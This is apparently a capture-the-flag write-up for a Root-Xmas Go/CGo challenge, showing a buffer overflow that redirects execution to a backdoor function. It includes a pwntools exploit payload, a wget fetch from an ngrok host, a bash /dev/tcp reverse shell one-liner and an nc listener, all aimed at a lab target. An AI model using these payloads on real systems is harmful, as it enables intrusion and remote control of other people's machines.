---
layout: Post
format: chall
title: Day 07 - Go, Pwn, Gown
date: 2024-12-11
ctf: Root-Xmas
tags: [Go, Buffer Overflow, RCE, Revshell]
category: [Pwn]
---
# Day 07 - Go, Pwn, Gown

<a class="back-link" href="../../">< Go back</a>

## Description

I love golang because it's safe. But this... This scares me. I mean, comments should be comments... But sneak code is always enjoyable, isn't it?

Author : Laluka
<https://deploy.xmas.root-me.org/>

```bash
curl "http://host/areyou" # OK Annie?!
curl "http://host/?gown=please" # curl: (52) Empty reply from server
file docker-gown.bin
# docker-gown.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, ...
```

all files in [resources/](./resources) were provided.

## Challenge

### Reconnaisance

Looking at the app we are given, there's a flag file hidden in `/flag`. We have a golang code that has CGo inside.

That C code has a buffer overflow:

```c
void unsafeFunction(char *gown) {
    char buffer[64];
    memcpy(buffer, gown, 128); // UTF8 AMIRIGHT ?!
    printf("Received: %s\n", buffer);
}
```

The `buffer` array is passed 128 bytes in it's 64 slots, we can exploit this to overwrite the return address of `unsafeFunction` and get into `laluBackdoor`:

```c
void laluBackdoor() {
    char *bash_path = "/bin/bash";
    extern char **environ;
    execle(bash_path, bash_path, "-c", "echo $(${GOWN})", NULL, environ);
}
```

`laluBackdoor` let's us run anything stored inside `$GOWN`. Which is the value passed as a parameter to the code:

```go
gown := r.URL.Query().Get("gown")
// ...
cGown := C.CString(gown)
if i := strings.IndexByte(gown, '\x00'); i != -1 {
  gown = gown[:i]
}
os.Setenv("GOWN", string(gown))
// ...
defer C.free(unsafe.Pointer(cGown))
C.unsafeFunction(cGown)
```

The actual data given to `$GOWN` is cut at a null byte, though the trailing data which is our payload is still present in memory.

### Building the payload

Our payload requires 64 bytes of padding to fill the `buffer` array in `unsafeFunction`, then it needs 8 bytes of extra padding to pad over `%rbp` and finally we can write our 8 bytes of return address to `laluBackdoor`:

```
[ 'A' * (64 + 8) bytes ][ laluBackdoor address ]
```

Let's first identify the address of `laluBackdoor`, build the project using `docker-compose up -d` and let's get into the container:

```bash
docker ps
docker exec -it <container_id> /bin/bash
$ nm /app/gown | grep laluBackdoor
# 61eb91 T laluBackdoor
```

Perfect, now instead of a simple 'A' padding, let's think of a payload we can use to exfiltrate the flag. Most command output will be lost as the server doesn't reply them. The most direct option is to revshell the flag.

### Exploiting

I'm using ngrok, and the URL itself is pretty long and goes over our `'A' * (64 + 8 - 1)` padding (remember that we need 1 byte for the null byte at the end)

So instead of opting for a one-liner rev shell command, let's upload our revshell and then run it. We can use `curl` to upload the file and then run it.

Let's write a short name file ([o](./o)):

```bash
sh -i 5<> /dev/tcp/<REV_IP>/3005 0<&5 1>&5 2>&5
```

Then serve it using a simple python server `python -m http.server 8080` and ngrok `ngrok http 8080`.

Now we can build our first payload, let's use the `pwntools` library in python:

```py
payload = b"wget https://5637-163-5-23-73.ngrok-free.app/o\x00"
payload = payload + b"A" * (64 - len(payload)) + b"B" * 8 + p64(0x61eb91)
payload = quote_plus(payload).encode()
request = b'GET /?gown=' + payload + b' HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n'
```

Once the payload is sent we just have to switch the main second bash payload and start our listener using `nc -lvp 3005`.

```py
payload = b"/bin/bash o\x00"
```

When connected, navigate to `/flag` and get the flag!
